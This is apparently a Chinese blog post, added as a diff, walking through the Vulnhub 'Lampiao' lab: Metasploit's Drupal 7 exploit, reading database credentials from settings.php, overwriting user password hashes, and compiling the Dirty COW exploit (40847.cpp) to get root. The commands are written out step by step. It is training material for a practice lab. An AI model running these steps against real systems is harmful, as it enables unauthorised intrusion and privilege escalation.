@@ -1,0 +1,151 @@
+---
+layout: post
+title: Lampiao
+subtitle: Lampiao
+date: 2023-07-11 17:52
+author: Kyon-H
+header-img: img/post-bg-2015.jpg
+tags:
+  - 靶场实战
+  - Vulnhub
+published: true
+number headings: first-level 2, max 4, 1.1., auto
+---
+
+## 1. 信息搜集
+
+IP 扫描，发现主机 `192.168.163.131`
+
+![image.png](https://img.ghostliner.top/uOvsti.png)
+
+端口扫描，发现三个端口
+
+```shell
+nmap -T4 -A -p- 192.168.163.131
+```
+
+![image.png](https://img.ghostliner.top/UiAH2o.png)
+
+## 2. 渗透测试
+
+访问 80 端口，未发现有效信息，目录扫描未发现其他目录
+
+访问 1898 端口，发现网站，扫描目录，发现 robots.txt
+
+查看文章，发现 url 格式 `http://192.168.163.131:1898/?q=node/2`，更改数字发现 3 个页面，发现两个音频文件和一个图片
+
+`whatweb` 扫描网站框架，`Drupal 7`
+
+![image.png](https://img.ghostliner.top/4irltv.png)
+
+### 2.1. 反弹 shell
+
+`msfconsole` 搜索相关漏洞
+
+![image.png](https://img.ghostliner.top/aR9Xas.png)
+
+使用编号为 1 的漏洞
+
+```shell
+use 1
+options
+set rhosts 192.168.163.131
+set rport 1898
+run
+```
+
+连接成功后，进入 shell
+
+```shell
+shell
+python -c "import pty;pty.spawn('/bin/bash')"
+```
+
+搜索 Drupal 站点的配置文件
+
+```shell
+# 搜索配置文件
+find . -name "setting*" -type f
+# 搜索密码加密脚本
+find . -name "pass*" -type f
+```
+
+搜索到 `./sites/default/settings.php` `./scripts/password-hash.sh`
+
+查看 settings.php，发现数据库配置
+
+```
+'database' => 'drupal',
+'username' => 'drupaluser',
+'password' => 'Virgulino',
+```
+
+使用 `./scripts/password-hash.sh 123` 生成密码，用于更改用户密码
+
+```
+123:$S$DFn4g4WKRfqgHk28yFUea5g5jNoWb/iHXIPDz6BtI2dqdrw.UOmz
+```
+
+### 2.2. 连接数据库
+
+```shell
+mysql -u drupaluser -pVirgulino
+```
+
+```mysql
+use drupal;
+show tables;
+select * from users\G;
+# tiago $S$DNZ5o1k/NY7SUgtJvjPqNl40kHKwn4yXy2eroEnOAlpmT0TJ9Sx8
+# Eder $S$Dv5orvhi7okjmViImnVPmVgfwJ2U..PNK4E9IT/k7Lqz9GZRb7tY
+update users set pass='$S$DFn4g4WKRfqgHk28yFUea5g5jNoWb/iHXIPDz6BtI2dqdrw.UOmz' where uid=1 or uid=2;
+```
+
+登录网站。
+
+使用数据库密码尝试登录用户：`tiago`
+
+`ls -R /home` tiago 用户目录下无东西，尝试提权
+
+```shell
+sudo -l
+# Sorry, user tiago may not run sudo on lampiao.
+find / -exec "/bin/bash" -p \; -quit
+```
+
+### 2.3. 内核提权
+
+查看内核版本
+
+![image.png](https://img.ghostliner.top/82QdBK.png)
+
+搜索脏牛漏洞 [CVE-2016-5195](https://nvd.nist.gov/vuln/detail/CVE-2016-5195)
+
+```shell
+searchsploit dirty
+```
+
+![image.png](https://img.ghostliner.top/PB6RWu.png)
+
+使用 `40847.cpp`
+
+```shell
+# 复制到到当前目录
+searchsploit -m 40847.cpp
+# 传输到目标机
+scp 40847.cpp tiago@192.168.163.131:~
+```
+
+```shell
+# 在目标机上编译
+g++ -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil
+# 执行
+./40847
+# Root password is:   dirtyCowFun
+```
+
+![image.png](https://img.ghostliner.top/theoLU.png)
+
+root 登录，获取 flag 文件
+
+![image.png](https://img.ghostliner.top/RNpcqa.png)
